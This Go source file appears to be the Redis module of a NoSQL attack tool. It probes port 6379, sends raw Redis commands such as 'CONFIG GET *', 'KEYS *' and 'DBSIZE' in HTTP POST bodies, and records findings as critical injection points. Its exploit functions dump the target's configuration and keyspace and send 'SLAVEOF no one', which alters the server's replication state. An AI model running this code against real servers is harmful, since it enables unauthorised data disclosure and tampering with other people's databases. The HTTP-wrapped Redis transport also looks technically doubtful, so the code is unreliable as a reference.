package nosql

import (
	"fmt"
	"strings"
	"time"
)

type RedisScanner struct {
	config *NoSQLConfig
	client *HTTPClient
}

func NewRedisScanner(config *NoSQLConfig, client *HTTPClient) *RedisScanner {
	return &RedisScanner{
		config: config,
		client: client,
	}
}

func (r *RedisScanner) TestConnection(target string) bool {
	url := BuildURL(target, "/", 6379)
	_, body, err := r.client.Get(url, nil)
	if err != nil {
		return false
	}
	return strings.Contains(string(body), "PONG") || strings.Contains(string(body), "redis_version")
}

func (r *RedisScanner) GetVersion(target string) string {
	url := BuildURL(target, "/", 6379)
	_, body, err := r.client.Get(url, nil)
	if err != nil {
		return ""
	}

	output := string(body)
	if strings.Contains(output, "redis_version:") {
		parts := strings.Split(output, "\r\n")
		for _, part := range parts {
			if strings.Contains(part, "redis_version:") {
				versionParts := strings.Split(part, ":")
				if len(versionParts) > 1 {
					return strings.TrimSpace(versionParts[1])
				}
			}
		}
	}
	return ""
}

func (r *RedisScanner) TestCommandInject(target string) *InjectionPoint {
	url := BuildURL(target, "/", 6379)

	payloads := []string{
		"INFO",
		"CONFIG GET *",
		"KEYS *",
		"DBSIZE",
		"INFO server",
		"INFO keyspace",
	}

	for _, payload := range payloads {
		body := strings.NewReader(payload + "\r\n")
		resp, respBody, err := r.client.Post(url, body, map[string]string{
			"Content-Type": "text/plain",
		})
		if err != nil {
			continue
		}

		if resp.StatusCode == 200 {
			output := string(respBody)
			if strings.Contains(output, "redis_version") ||
				strings.Contains(output, "dir") ||
				strings.Contains(output, "db0") {
				return &InjectionPoint{
					ID:        GenerateID(),
					Target:    target,
					DBType:    NoSQLDBRedis,
					Technique: TechniqueCommandInject,
					Field:     "command",
					Payload:   payload,
					Parameters: map[string]string{
						"method": "inline_command",
					},
					Severity:  SeverityCritical,
					Verified:  true,
					Timestamp: time.Now(),
				}
			}
		}
	}
	return nil
}

func (r *RedisScanner) TestKeyDump(target string) *InjectionPoint {
	url := BuildURL(target, "/", 6379)

	payload := "KEYS *\r\n"
	body := strings.NewReader(payload)
	resp, respBody, err := r.client.Post(url, body, map[string]string{
		"Content-Type": "text/plain",
	})
	if err != nil {
		return nil
	}

	if resp.StatusCode == 200 {
		output := string(respBody)
		if strings.Contains(output, "*") || strings.Contains(output, "$") {
			return &InjectionPoint{
				ID:        GenerateID(),
				Target:    target,
				DBType:    NoSQLDBRedis,
				Technique: TechniqueKeyDump,
				Field:     "keys",
				Payload:   "KEYS *",
				Parameters: map[string]string{
					"method": "key_enumeration",
				},
				Severity:  SeverityHigh,
				Verified:  true,
				Timestamp: time.Now(),
			}
		}
	}
	return nil
}

func (r *RedisScanner) ExploitCommandInject(injection *InjectionPoint) (string, error) {
	url := BuildURL(injection.Target, "/", 6379)

	commands := []string{
		"INFO",
		"CONFIG GET dir",
		"CONFIG GET dbfilename",
		"INFO keyspace",
		"SLAVEOF no one",
	}

	var output strings.Builder
	for _, cmd := range commands {
		body := strings.NewReader(cmd + "\r\n")
		_, resp, err := r.client.Post(url, body, map[string]string{
			"Content-Type": "text/plain",
		})
		if err != nil {
			output.WriteString(fmt.Sprintf("Error executing %s: %v\n", cmd, err))
			continue
		}
		output.WriteString(fmt.Sprintf("=== %s ===\n%s\n", cmd, string(resp)))
	}

	return output.String(), nil
}

func (r *RedisScanner) ExploitKeyDump(injection *InjectionPoint) (map[string]interface{}, error) {
	url := BuildURL(injection.Target, "/", 6379)

	data := make(map[string]interface{})

	dbsizeCmd := "DBSIZE\r\n"
	body := strings.NewReader(dbsizeCmd)
	_, dbsizeResp, err := r.client.Post(url, body, map[string]string{
		"Content-Type": "text/plain",
	})
	if err != nil {
		return nil, fmt.Errorf("get dbsize: %w", err)
	}
	data["dbsize"] = string(dbsizeResp)

	infoCmd := "INFO keyspace\r\n"
	body = strings.NewReader(infoCmd)
	_, infoResp, err := r.client.Post(url, body, map[string]string{
		"Content-Type": "text/plain",
	})
	if err != nil {
		return nil, fmt.Errorf("get keyspace info: %w", err)
	}
	data["keyspace"] = string(infoResp)

	configCmd := "CONFIG GET *\r\n"
	body = strings.NewReader(configCmd)
	_, configResp, err := r.client.Post(url, body, map[string]string{
		"Content-Type": "text/plain",
	})
	if err != nil {
		return nil, fmt.Errorf("get config: %w", err)
	}
	data["config"] = string(configResp)

	data["method"] = "redis_key_dump"
	return data, nil
}
